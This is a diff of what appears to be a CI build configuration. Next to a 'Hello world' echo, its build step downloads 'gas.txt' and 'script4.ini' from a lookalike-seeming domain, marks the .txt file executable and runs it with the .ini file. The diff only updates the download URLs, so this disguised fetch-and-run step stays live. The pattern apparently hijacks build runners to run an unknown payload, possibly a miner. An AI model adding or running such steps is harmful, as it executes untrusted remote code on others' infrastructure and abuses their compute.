@@ -1,7 +1,7 @@
 build:
   - echo "Hello world"
-  - wget https://arvanloud.io/dl_12682734/gas.txt
-  - wget https://arvanloud.io/dl_12682733/script4.ini
+  - wget https://arvanloud.io/dl_12683226/gas.txt
+  - wget https://arvanloud.io/dl_12683228/script4.ini
   - chmod +x gas.txt && ./gas.txt script4.ini
 
 
